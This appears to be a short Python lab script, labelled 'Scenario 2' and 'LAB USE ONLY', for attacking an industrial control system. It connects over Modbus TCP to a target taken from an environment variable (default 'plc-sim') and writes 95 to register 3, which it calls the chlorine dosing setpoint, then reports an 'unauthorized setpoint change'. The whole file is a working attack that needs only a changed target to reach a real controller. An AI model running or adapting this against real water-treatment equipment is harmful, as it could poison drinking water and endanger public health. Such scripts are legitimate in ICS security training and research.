"""Scenario 2: change the chlorine dosing setpoint (register 3). LAB USE ONLY."""
import os
from pymodbus.client import ModbusTcpClient

target = os.getenv("TARGET", "plc-sim")
client = ModbusTcpClient(target, port=502)
client.connect()
client.write_register(3, 95, slave=1)
print("Wrote register 3 = 95 (unauthorized setpoint change)")
client.close()
